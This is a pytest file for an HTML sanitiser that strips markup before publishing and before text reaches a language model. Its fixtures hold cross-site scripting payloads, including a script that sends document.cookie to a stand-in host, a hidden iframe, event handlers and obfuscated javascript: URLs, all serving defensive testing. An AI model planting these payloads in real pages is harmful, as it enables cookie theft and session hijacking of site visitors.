"""HTML sanitisation — fixture zen-07 (and iea-10 for the LLM-input path)."""

from __future__ import annotations

import pytest

from harvest.sanitize import html_to_text, sanitize_html

ZEN_07 = """
<p>A dataset of <strong>lidar</strong> measurements from the
<a href="https://example.org/campaign" onclick="steal()">2021 campaign</a>.</p>
<script>fetch('https://evil.example/'+document.cookie)</script>
<style>body { display: none }</style>
<p onmouseover="alert(1)">Contact <a href="javascript:alert(1)">the author</a>.</p>
<!-- an internal note that must not be published -->
<iframe src="https://evil.example/frame"></iframe>
"""


class TestZen07:
    def test_script_tag_and_its_content_are_removed(self) -> None:
        cleaned = sanitize_html(ZEN_07)
        assert "<script" not in cleaned
        assert "fetch(" not in cleaned
        assert "document.cookie" not in cleaned

    def test_style_tag_and_its_content_are_removed(self) -> None:
        cleaned = sanitize_html(ZEN_07)
        assert "<style" not in cleaned and "display: none" not in cleaned

    def test_event_handlers_are_removed(self) -> None:
        cleaned = sanitize_html(ZEN_07)
        assert "onclick" not in cleaned
        assert "onmouseover" not in cleaned
        assert "alert(1)" not in cleaned

    def test_javascript_urls_are_removed(self) -> None:
        assert "javascript:" not in sanitize_html(ZEN_07)

    def test_iframes_are_removed(self) -> None:
        assert "<iframe" not in sanitize_html(ZEN_07)

    def test_comments_are_removed(self) -> None:
        assert "internal note" not in sanitize_html(ZEN_07)

    def test_safe_content_survives(self) -> None:
        cleaned = sanitize_html(ZEN_07)
        assert "<strong>lidar</strong>" in cleaned
        assert 'href="https://example.org/campaign"' in cleaned
        assert "2021 campaign" in cleaned

    def test_links_get_rel_nofollow(self) -> None:
        assert 'rel="nofollow noopener"' in sanitize_html(ZEN_07)


class TestSanitizePolicy:
    @pytest.mark.parametrize(
        "html,forbidden",
        [
            ('<a href="JavaScript:alert(1)">x</a>', "javascript"),
            ('<a href="java\tscript:alert(1)">x</a>', "script:"),
            ('<a href="//evil.example/x">x</a>', "evil.example"),
            ('<p class="tracker" id="t" style="color:red">x</p>', "tracker"),
            ('<img src="x" onerror="alert(1)">', "onerror"),
            ('<object data="x.swf"></object>', "object"),
            ('<svg><script>alert(1)</script></svg>', "alert"),
        ],
    )
    def test_dangerous_constructs_are_stripped(self, html: str, forbidden: str) -> None:
        assert forbidden not in sanitize_html(html).lower()

    def test_text_is_escaped_not_dropped(self) -> None:
        assert sanitize_html("5 < 6 & 7 > 2") == "5 &lt; 6 &amp; 7 &gt; 2"

    def test_unclosed_tags_are_closed(self) -> None:
        assert sanitize_html("<p>hanging") == "<p>hanging</p>"

    def test_none_and_empty(self) -> None:
        assert sanitize_html(None) == ""
        assert sanitize_html("") == ""

    def test_plain_text_passes_through(self) -> None:
        assert sanitize_html("Just a description.") == "Just a description."

    def test_is_idempotent(self) -> None:
        once = sanitize_html(ZEN_07)
        assert sanitize_html(once) == once


class TestHtmlToText:
    """The LLM-input path: markup never reaches a model (zen-07, iea-10)."""

    def test_no_markup_survives(self) -> None:
        text = html_to_text(ZEN_07)
        assert "<" not in text and ">" not in text
        assert "href" not in text

    def test_script_content_never_reaches_the_model(self) -> None:
        text = html_to_text(ZEN_07)
        assert "fetch(" not in text
        assert "document.cookie" not in text
        assert "display: none" not in text

    def test_body_text_survives(self) -> None:
        text = html_to_text(ZEN_07)
        assert "lidar" in text and "2021 campaign" in text

    def test_boilerplate_shape_collapses_whitespace(self) -> None:
        html = "<div>\n\n  <p>one</p>\n\n\n  <p>two</p>\n\n</div>"
        assert html_to_text(html) == "one\n\ntwo"

    def test_none_and_empty(self) -> None:
        assert html_to_text(None) == ""
        assert html_to_text("") == ""
